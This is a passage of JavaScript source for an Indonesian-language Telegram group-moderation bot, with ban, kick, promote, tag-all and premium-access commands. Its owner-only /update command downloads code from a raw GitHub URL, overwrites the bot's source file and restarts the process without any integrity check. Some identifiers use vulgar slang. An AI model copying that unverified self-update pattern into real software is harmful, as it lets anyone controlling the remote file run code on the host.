            `🚫 User telah dikeluarkan dari grup dan tidak bisa bergabung kembali.`;
        
        if (ctx.message.reply_to_message) {
            await ctx.reply(message, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(message, { parse_mode: 'Markdown' });
        }
        
    } catch (error) {
        console.error('Error in /ban:', error);
        await ctx.reply(
            '❌ Gagal membanned user.\n\n' +
            'Pastikan:\n' +
            '✓ Bot adalah admin\n' +
            '✓ Bot memiliki izin "Ban Users"\n' +
            '✓ User yang ingin dibanned bukan admin\n' +
            '✓ Username/ID valid'
        );
    }
});
///kick
bot.command('kick', async (ctx) => {
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await isAdmin(ctx)) {
        await ctx.reply('❌ Anda harus menjadi admin untuk melakukan kick!');
        return;
    }
    
    if (!await isBotAdmin(ctx)) {
        await ctx.reply('❌ Bot harus menjadi admin untuk melakukan kick!');
        return;
    }
    
    const result = await getTargetUser(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId } = result;
    
    try {
        // Kick user (ban lalu unban)
        await ctx.telegram.banChatMember(ctx.chat.id, targetUserId);
        await ctx.telegram.unbanChatMember(ctx.chat.id, targetUserId);
        
        const userMention = targetUser.username 
            ? `@${targetUser.username}` 
            : `${targetUser.first_name}`;
        
        const message = `✅ *${userMention}* telah dikeluarkan dari grup!`;
        
        if (ctx.message.reply_to_message) {
            await ctx.reply(message, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(message, { parse_mode: 'Markdown' });
        }
        
    } catch (error) {
        console.error('Error in /kick:', error);
        await ctx.reply('❌ Gagal mengkick user!');
    }
});
//unban
bot.command('unban', async (ctx) => {
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await isAdmin(ctx)) {
        await ctx.reply('❌ Anda harus menjadi admin untuk melakukan unban!');
        return;
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply('⚠️ Gunakan: `/unban @username` atau `/unban user_id`', { parse_mode: 'Markdown' });
        return;
    }
    
    let targetUserId = null;
    let targetUser = null;
    
    const mentionMatch = args[1].match(/^@([a-zA-Z0-9_]+)$/);
    if (mentionMatch) {
        const username = mentionMatch[1];
        try {
            const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
            targetUser = chatMember.user;
            targetUserId = targetUser.id;
        } catch (error) {
            await ctx.reply(`❌ User @${username} tidak ditemukan!`);
            return;
        }
    } 

    else if (/^\d+$/.test(args[1])) {
        targetUserId = parseInt(args[1]);
        try {
            const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, targetUserId);
            targetUser = chatMember.user;
        } catch (error) {

        }
    } else {
        await ctx.reply('❌ Format tidak valid! Gunakan @username atau user_id');
        return;
    }
    
    try {

        await ctx.telegram.unbanChatMember(ctx.chat.id, targetUserId);
        
        bannedUsers.delete(targetUserId);
        
        const userMention = targetUser?.username 
            ? `@${targetUser.username}` 
            : targetUser?.first_name || `ID ${targetUserId}`;
        
        await ctx.reply(`✅ *${userMention}* telah diunban!`, { parse_mode: 'Markdown' });
        
    } catch (error) {
        console.error('Error in /unban:', error);
        await ctx.reply('❌ Gagal mengunban user!');
    }
});
///unmute
bot.command('unmute', async (ctx) => {
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await isAdmin(ctx)) {
        await ctx.reply('❌ Anda harus menjadi admin untuk melakukan unmute!');
        return;
    }
    
    const result = await getTargetUser(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId } = result;
    
    try {
        await ctx.telegram.restrictChatMember(ctx.chat.id, targetUserId, {
            can_send_messages: true,
            can_send_media_messages: true,
            can_send_other_messages: true,
            can_add_web_page_previews: true
        });
        
        const userMention = targetUser.username 
            ? `@${targetUser.username}` 
            : `${targetUser.first_name}`;
        
        await ctx.reply(`🔊 *${userMention}* telah di-unmute!`, { parse_mode: 'Markdown' });
        
    } catch (error) {
        console.error('Error in /unmute:', error);
        await ctx.reply('❌ Gagal mengunmute user!');
    }
});
///anti doc
const antiDocumentStatus = new Map();
 
bot.command('antidoc', async (ctx) => {
    const chatId = ctx.chat.id;
    
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await isAdmin(ctx)) {
        await ctx.reply('❌ Anda harus menjadi admin untuk menggunakan perintah ini!');
        return;
    }
    
    const args = ctx.message.text.split(' ');
    const subCommand = args[1];
    
    const status = getKontolStatus(chatId);

    if (subCommand === 'on') {
        status.enabled = true;
        await ctx.reply(
            '✅ *Anti Document Diaktifkan!*\n\n' +
            'Bot akan otomatis menghapus semua dokumen/file yang dikirim di grup ini.\n\n' +
            'Gunakan `/antidoc off` untuk menonaktifkan.',
            { parse_mode: 'Markdown' }
        );
    } 
    
    else if (subCommand === 'off') {
        status.enabled = false;
        await ctx.reply(
            '❌ *Anti Document Dinonaktifkan!*\n\n' +
            'Bot tidak akan menghapus dokumen/file yang dikirim.\n\n' +
            'Gunakan `/antidoc on` untuk mengaktifkan kembali.',
            { parse_mode: 'Markdown' }
        );
    }
    
    else if (subCommand === 'status') {
        const isEnabled = status.enabled;
        const statusText = isEnabled ? '✅ AKTIF' : '❌ NONAKTIF';
        const statusIcon = isEnabled ? '🛡️ Proteksi Aktif' : '⚠️ Proteksi Nonaktif';
        
        let message = `📊 *Status Anti Document*\n\n` +
            `🔒 *Status:* ${statusText}\n` +
            `📝 *Keterangan:* ${statusIcon}\n\n`;
        
        if (isEnabled) {
            message += `✨ *Fitur:*\n` +
                `• Semua dokumen akan otomatis dihapus\n` +
                `• Pengirim akan mendapat peringatan\n` +
                `• Pesan peringatan akan hilang setelah 5 detik\n\n` +
                `Gunakan \`/antidoc off\` untuk menonaktifkan.`;
        } else {
            message += `⚙️ *Fitur sedang nonaktif*\n\n` +
                `Gunakan \`/antidoc on\` untuk mengaktifkan proteksi.`;
        }
        
        await ctx.reply(message, { parse_mode: 'Markdown' });
    }

    else {
        await ctx.reply(
            '⚠️ *Penggunaan:*\n\n' +
            '`/antidoc on` - Mengaktifkan anti document\n' +
            '`/antidoc off` - Menonaktifkan anti document\n' +
            '`/antidoc status` - Melihat status saat ini',
            { parse_mode: 'Markdown' }
        );
    }
});

bot.on('document', async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const messageId = ctx.message.message_id;
    
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        return;
    }
    
    const status = await getKontolStatus(chatId);
    
    if (!status.enabled) {
        return; 
    }
   
    if (!await isBotAdmin(ctx)) {
        await ctx.reply('⚠️ Bot tidak memiliki izin untuk menghapus pesan! Jadikan bot sebagai admin terlebih dahulu.');
        return;
    }
    
    const document = ctx.message.document;
    const fileName = document.file_name;
    const fileSize = (document.file_size / 1024 / 1024).toFixed(2);
    
    try {
        await ctx.deleteMessage(messageId);
        
        const warningMessage = `⚠️ *Dokumen Dihapus!*\n\n` +
            `📄 *File:* ${fileName}\n` +
            `📦 *Ukuran:* ${fileSize} MB\n` +
            `👤 *User:* ${ctx.from.first_name}\n` +
            `🤖 *Alasan:* Anti document sedang aktif\n\n` +
            `❌ Dilarang mengirim dokumen/file di grup ini!`;
        
        const warningMsg = await ctx.reply(warningMessage, { 
            parse_mode: 'Markdown',
            reply_to_message_id: messageId
        });
        setTimeout(async () => {
            try {
                await ctx.deleteMessage(warningMsg.message_id);
            } catch (error) {
            }
        }, 5000);
        
        console.log(`🗑️ Document deleted: ${fileName} from user ${userId} in chat ${chatId}`);
        
    } catch (error) {
        console.error('Failed to delete document:', error);

        if (error.description && error.description.includes('not enough rights')) {
            await ctx.reply('❌ Bot tidak memiliki izin untuk menghapus pesan! Pastikan bot adalah admin.');
        }
    }
});
///DEMOTW
bot.command('demote', async (ctx) => {
    const chatId = ctx.chat.id;
    
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await canPromote(ctx)) {
        await ctx.reply('❌ Anda tidak memiliki izin untuk mendemote user!', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!await canBotPromote(ctx)) {
        await ctx.reply('❌ Bot tidak memiliki izin untuk mendemote user!', { parse_mode: 'Markdown' });
        return;
    }
    
    const result = await getKontolTarget(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId, targetUsername, method } = result;
    
    // Cek apakah target adalah creator
    if (await isCreator(ctx, targetUserId)) {
        await ctx.reply('❌ Tidak bisa mendemote creator grup!');
        return;
    }
    
    // Cek apakah target adalah bot itu sendiri
    if (targetUserId === ctx.botInfo.id) {
        await ctx.reply('❌ Tidak bisa mendemote bot!');
        return;
    }
    
    try {
        const loadingMsg = await ctx.reply('⏳ Sedang mendemote user...');
        
        // Demote user (hapus semua hak admin)
        await ctx.telegram.promoteChatMember(chatId, targetUserId, {
            can_change_info: false,
            can_delete_messages: false,
            can_ban_users: false,
            can_invite_users: false,
            can_pin_messages: false,
            can_manage_call: false,
            can_manage_chat: false,
            can_promote_members: false
        });
        
        // Catat log
        addLog(chatId, 'demote', targetUser, ctx.from);
        
        const userMention = targetUsername ? `@${targetUsername}` : `${targetUser.first_name}`;
        const adminMention = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
        
        const successMessage = `⬇️ *USER BERHASIL DIDEMOTE!*\n\n` +
            `👤 *User:* ${userMention}\n` +
            `🆔 *ID:* ${targetUserId}\n` +
            `👮 *Didemote oleh:* ${adminMention}\n\n` +
            `🔻 User sekarang bukan lagi admin grup.`;
        
        await ctx.deleteMessage(loadingMsg.message_id);
        
        if (method === 'reply') {
            await ctx.reply(successMessage, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(successMessage, { parse_mode: 'Markdown' });
        }
        
        setTimeout(async () => {
            try {
                await ctx.deleteMessage(ctx.message.message_id);
            } catch (error) {}
        }, 5000);
        
    } catch (error) {
        console.error('Error in demote:', error);
        await ctx.reply('❌ Gagal mendemote user! Pastikan bot memiliki hak yang cukup.');
    }
});
///promote
const promoteLog = new Map();

bot.command('promotemedium', async (ctx) => {
    const chatId = ctx.chat.id;

    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }

    if (!await canPromote(ctx)) {
        await ctx.reply('❌ Anda tidak memiliki izin untuk mempromote user!\n\nHanya creator atau admin dengan hak *Promote Members* yang bisa menggunakan perintah ini.', { parse_mode: 'Markdown' });
        return;
    }
 
    if (!await canBotPromote(ctx)) {
        await ctx.reply('❌ Bot tidak memiliki izin untuk mempromote user!\n\nPastikan bot adalah admin dengan hak *Promote Members*.', { parse_mode: 'Markdown' });
        return;
    }
 
    const result = await getKontolTarget(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId, targetUsername, method } = result;
   
    if (targetUserId === ctx.botInfo.id) {
        await ctx.reply('❌ Tidak bisa mempromote bot itu sendiri!');
        return;
    }
 
    if (await isAlreadyAdmin(ctx, targetUserId)) {
        const userMention = targetUsername ? `@${targetUsername}` : `${targetUser.first_name}`;
        await ctx.reply(`⚠️ *${userMention}* sudah menjadi admin grup!`, { parse_mode: 'Markdown' });
        return;
    }
 
    if (await isCreator(ctx, targetUserId)) {
        await ctx.reply('❌ Tidak bisa mempromote creator grup!');
        return;
    }
    
    try {

        const loadingMsg = await ctx.reply('⏳ Sedang mempromote user...');
        
        await ctx.telegram.promoteChatMember(chatId, targetUserId, DEFAULT_ADMIN_RIGHTS);
        
        addLog(chatId, 'promote', targetUser, ctx.from, DEFAULT_ADMIN_RIGHTS);
        
        const userMention = targetUsername ? `@${targetUsername}` : `${targetUser.first_name} ${targetUser.last_name || ''}`;
        const adminMention = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
        
        // Pesan sukses
        let successMessage = `✅ *USER BERHASIL DIPROMOTE!*\n\n` +
            `👑 *User:* ${userMention}\n` +
            `🆔 *ID:* ${targetUserId}\n` +
            `👮 *Dipromote oleh:* ${adminMention}\n\n` +
            `📋 *Hak Akses:*\n` +
            `• ✅ Ubah Info Grup\n` +
            `• ✅ Hapus Pesan\n` +
            `• ✅ Banned User\n` +
            `• ✅ Undang User\n` +
            `• ✅ Pin Pesan\n` +
            `• ✅ Kelola Panggilan\n\n` +
            `🎉 Selamat! User sekarang menjadi admin grup.`;

        await ctx.deleteMessage(loadingMsg.message_id);
        
        if (method === 'reply') {
            await ctx.reply(successMessage, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(successMessage, { parse_mode: 'Markdown' });
        }
        
        // Hapus pesan perintah
        setTimeout(async () => {
            try {
                await ctx.deleteMessage(ctx.message.message_id);
            } catch (error) {
                // Ignore
            }
        }, 5000);
        
    } catch (error) {
        console.error('Error in promote:', error);
        await ctx.reply(
            '❌ *Gagal mempromote user!*\n\n' +
            'Pastikan:\n' +
            '✓ Bot memiliki hak *Promote Members*\n' +
            '✓ Bot memiliki peringkat lebih tinggi dari user\n' +
            '✓ User bukan creator grup',
            { parse_mode: 'Markdown' }
        );
    }
});

// Command promote full (semua hak akses)
bot.command('promotehard', async (ctx) => {
    const chatId = ctx.chat.id;
    
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await canPromote(ctx)) {
        await ctx.reply('❌ Anda tidak memiliki izin untuk mempromote user!', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!await canBotPromote(ctx)) {
        await ctx.reply('❌ Bot tidak memiliki izin untuk mempromote user!', { parse_mode: 'Markdown' });
        return;
    }
    
    const result = await getKontolTarget(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId, targetUsername, method } = result;
    
    if (targetUserId === ctx.botInfo.id) {
        await ctx.reply('❌ Tidak bisa mempromote bot itu sendiri!');
        return;
    }
    
    // Hak akses penuh (termasuk promote members)
    const FULL_ADMIN_RIGHTS = {
        ...DEFAULT_ADMIN_RIGHTS,
        can_promote_members: true
    };
    
    try {
        const loadingMsg = await ctx.reply('⏳ Sedang mempromote user dengan hak penuh...');
        
        await ctx.telegram.promoteChatMember(chatId, targetUserId, FULL_ADMIN_RIGHTS);
        
        addLog(chatId, 'promote_full', targetUser, ctx.from, FULL_ADMIN_RIGHTS);
        
        const userMention = targetUsername ? `@${targetUsername}` : `${targetUser.first_name}`;
        const adminMention = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
        
        const successMessage = `✅ *USER BERHASIL DIPROMOTE (HAK PENUH)!*\n\n` +
            `👑 *User:* ${userMention}\n` +
            `🆔 *ID:* ${targetUserId}\n` +
            `👮 *Dipromote oleh:* ${adminMention}\n\n` +
            `📋 *Hak Akses Penuh:*\n` +
            `• ✅ Semua hak admin termasuk Promote Members\n\n` +
            `⚠️ *Perhatian:* User sekarang dapat mempromote admin lain!`;
        
        await ctx.deleteMessage(loadingMsg.message_id);
        
        if (method === 'reply') {
            await ctx.reply(successMessage, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(successMessage, { parse_mode: 'Markdown' });
        }
        
        setTimeout(async () => {
            try {
                await ctx.deleteMessage(ctx.message.message_id);
            } catch (error) {}
        }, 5000);
        
    } catch (error) {
        console.error('Error in promote_full:', error);
        await ctx.reply('❌ Gagal mempromote user dengan hak penuh!');
    }
});

// Command promote limited (hak terbatas)
bot.command('promoteesy', async (ctx) => {
    const chatId = ctx.chat.id;
    
    if (ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
        await ctx.reply('❌ Perintah ini hanya bisa digunakan di dalam grup!');
        return;
    }
    
    if (!await canPromote(ctx)) {
        await ctx.reply('❌ Anda tidak memiliki izin untuk mempromote user!', { parse_mode: 'Markdown' });
        return;
    }
    
    if (!await canBotPromote(ctx)) {
        await ctx.reply('❌ Bot tidak memiliki izin untuk mempromote user!', { parse_mode: 'Markdown' });
        return;
    }
    
    const result = await getKontolTarget(ctx);
    if (result.error) {
        await ctx.reply(result.error);
        return;
    }
    
    const { targetUser, targetUserId, targetUsername, method } = result;
    
    if (targetUserId === ctx.botInfo.id) {
        await ctx.reply('❌ Tidak bisa mempromote bot itu sendiri!');
        return;
    }
    
    try {
        const loadingMsg = await ctx.reply('⏳ Sedang mempromote user dengan hak terbatas...');
        
        await ctx.telegram.promoteChatMember(chatId, targetUserId, LIMITED_ADMIN_RIGHTS);
        
        addLog(chatId, 'promote_limited', targetUser, ctx.from, LIMITED_ADMIN_RIGHTS);
        
        const userMention = targetUsername ? `@${targetUsername}` : `${targetUser.first_name}`;
        const adminMention = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
        
        const successMessage = `✅ *USER BERHASIL DIPROMOTE (HAK TERBATAS)!*\n\n` +
            `👑 *User:* ${userMention}\n` +
            `🆔 *ID:* ${targetUserId}\n` +
            `👮 *Dipromote oleh:* ${adminMention}\n\n` +
            `📋 *Hak Akses Terbatas:*\n` +
            `• ✅ Hapus Pesan\n` +
            `• ✅ Undang User\n\n` +
            `❌ *Tidak memiliki hak:* Ubah Info, Ban, Pin, Promote`;
        
        await ctx.deleteMessage(loadingMsg.message_id);
        
        if (method === 'reply') {
            await ctx.reply(successMessage, { 
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.reply_to_message.message_id
            });
        } else {
            await ctx.reply(successMessage, { parse_mode: 'Markdown' });
        }
        
        setTimeout(async () => {
            try {
                await ctx.deleteMessage(ctx.message.message_id);
            } catch (error) {}
        }, 5000);
        
    } catch (error) {
        console.error('Error in promote_limited:', error);
        await ctx.reply('❌ Gagal mempromote user dengan hak terbatas!');
    }
});
///update
const filePath = path.resolve(__dirname, "Angeles.js");
const repoRaw = "https://raw.githubusercontent.com/sakakaka29/Angeles/refs/heads/main/Angeles.js";

bot.command('update', async (ctx) => {
  if ((ctx.from.id != ownerID)) return ctx.reply("Lu Siapa Kontol Jijik Gwa");

  ctx.reply("⏳ Sedang mengecek update...");

  const { data } = await axios.get(repoRaw, { timeout: 10000 });

  if (!data) return ctx.reply("❌ Update gagal: File kosong!");

  // Backup file lama dengan nomor urut
  let backupPath = null;
  if (fs.existsSync(filePath)) {
    let i = 1;
    do {
      backupPath = `${filePath}.backup.${i}`;
      i++;
    } while (fs.existsSync(backupPath));

    fs.copyFileSync(filePath, backupPath);
  }

  // Tulis file baru
  fs.writeFileSync(filePath, data);
  ctx.reply(`✅ Update berhasil!\n📁 Backup dibuat: ${backupPath}\n🔄 Bot akan restart...`);

  setTimeout(() => process.exit(), 2000);
});
//tagall
bot.command('tagall', async (ctx) => {
    const chatId = ctx.chat.id;
    
    if (ctx.chat.type === 'private') {
        return ctx.reply('❌ Command ini hanya bisa digunakan di grup!');
    }
    
    try {
        const botMember = await ctx.telegram.getChatMember(chatId, ctx.botInfo.id);
        if (!['administrator', 'creator'].includes(botMember.status)) {
            return ctx.reply('❌ Bot harus menjadi admin grup untuk menggunakan fitur ini.');
        }
        
        const userMember = await ctx.telegram.getChatMember(chatId, ctx.from.id);
        if (!['administrator', 'creator'].includes(userMember.status)) {
            return ctx.reply('❌ Hanya admin grup yang bisa menggunakan command ini!');
        }
        
        const messageText = ctx.message.text;
        const customMessage = messageText.split('/all')[1]?.trim() || '';
        
        const statusMsg = await ctx.reply('🔄 *Mengumpulkan daftar member...*', {
            parse_mode: 'Markdown'
        });
        
        const totalMembers = await ctx.telegram.getChatMembersCount(chatId);
        
        await ctx.telegram.editMessageText(
            chatId,
            statusMsg.message_id,
            undefined,
            `📋 *Mengambil data member...*\nTotal: ${totalMembers} member\n\n⏳ Mohon tunggu, proses ini membutuhkan waktu...`,
            { parse_mode: 'Markdown' }
        );
        
        const allMembers = [];
        
        const admins = await ctx.telegram.getChatAdministrators(chatId);
        const adminIds = new Set();
        
        for (const admin of admins) {
            if (!admin.user.is_bot) {
                allMembers.push(admin.user);
                adminIds.add(admin.user.id);
            }
        }
                
        if (allMembers.length < totalMembers) {
            await ctx.telegram.editMessageText(
                chatId,
                statusMsg.message_id,
                undefined,
                `⚠️ *Peringatan*\n\nHanya ${allMembers.length} dari ${totalMembers} member yang dapat di-tag karena keterbatasan API Telegram.\n\nBot akan men-tag member yang tersedia.`,
                { parse_mode: 'Markdown' }
            );
            
            await kontol(3000);
        }
        
        if (allMembers.length === 0) {
            await ctx.reply('❌ Tidak ada member yang bisa di-tag.');
            await ctx.telegram.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
            return;
        }
        
        // Update status mulai tagging
        await ctx.telegram.editMessageText(
            chatId,
            statusMsg.message_id,
            undefined,
            `🚀 *Memulai tagging ${allMembers.length} member...*\n\n💬 Pesan: ${customMessage || 'Pemberitahuan dari admin'}`,
            { parse_mode: 'Markdown' }
        );
        
        let successCount = 0;
        let failCount = 0;
        const failedMembers = [];
        
        // Proses tagging satu per satu
        for (let i = 0; i < allMembers.length; i++) {
            const member = allMembers[i];
            
            try {
                let mention;
                
                if (member.username) {
                    mention = `@${member.username}`;
                } else {
                    const name = member.first_name || member.last_name || 'Member';
                    mention = `<a href="tg://user?id=${member.id}">${escapeHtml(name)}</a>`;
                }
                
                const tagMessage = customMessage 
                    ? `${mention} ${customMessage}`
                    : `${mention} 🔔 Pemberitahuan dari admin`;
                
                await ctx.reply(tagMessage, {
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                    disable_notification: false
                });
                
                successCount++;
                
                if ((i + 1) % 5 === 0 || i === allMembers.length - 1) {
                    await ctx.telegram.editMessageText(
                        chatId,
                        statusMsg.message_id,
                        undefined,
                        `🚀 *Proses Tagging*\n\n` +
                        `📝 Progress: ${i + 1}/${allMembers.length}\n` +
                        `✅ Berhasil: ${successCount}\n` +
                        `❌ Gagal: ${failCount}\n` +
                        `💬 Pesan: ${customMessage || 'Pemberitahuan dari admin'}`,
                        { parse_mode: 'Markdown' }
                    ).catch(() => {});
                }
                
                await kontol(1000);
                
            } catch (error) {
                failCount++;
                failedMembers.push({
                    id: member.id,
                    name: member.first_name || member.username || 'Unknown',
                    error: error.message
                });
                console.error(`Failed to tag ${member.id}:`, error.message);
            }
        }
        
        let report = `✅ *Tagging Selesai*\n\n` +
            `📊 *Statistik:*\n` +
            `✅ Berhasil: ${successCount}\n` +
            `❌ Gagal: ${failCount}\n` +
            `📝 Total: ${allMembers.length}\n\n` +
            `💬 Pesan: "${customMessage || 'Pemberitahuan dari admin'}"`;
        
        if (failedMembers.length > 0 && failedMembers.length <= 10) {
            report += `\n\n*❌ Gagal ditag:*\n`;
            failedMembers.forEach(m => {
                report += `- ${escapeMarkdown(m.name)} (ID: ${m.id})\n`;
            });
        } else if (failedMembers.length > 10) {
            report += `\n\n*❌ Gagal ditag:* ${failedMembers.length} member (terlalu banyak untuk ditampilkan)`;
        }
        
        await ctx.reply(report, { parse_mode: 'Markdown' });
        
        await ctx.telegram.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
        
    } catch (error) {
        console.error('Error:', error);
        ctx.reply('❌ Terjadi kesalahan. Pastikan bot adalah admin dan memiliki izin.');
    }
});

function kontol(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});
///END TOLLS 
const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
